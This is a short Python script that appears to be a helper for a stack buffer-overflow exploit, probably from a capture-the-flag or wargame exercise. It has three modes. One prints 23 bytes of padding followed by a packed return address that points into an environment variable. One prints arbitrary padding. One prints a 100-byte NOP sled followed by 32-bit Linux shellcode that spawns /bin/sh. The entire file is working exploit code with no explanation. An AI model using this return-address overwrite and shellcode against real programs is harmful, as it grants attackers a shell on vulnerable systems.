import sys,struct

if len(sys.argv) < 2:
    print("Usage {} [exploit|pad|shellcode]".format(sys.argv[0]))
    exit(1)

if sys.argv[1] == "exploit":
    env_var = struct.pack("I", 0xbfffff5b+30)
    exploit = ""
    exploit += "A"*23 # Padding
    exploit += env_var # Overwrite the return address

    print(exploit)
elif sys.argv[1] == "pad":
    pad = "A"*int(sys.argv[2])
    print(pad)
elif sys.argv[1] == "shellcode":
    shellcode = "\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"

    print("\x90"*100+shellcode)
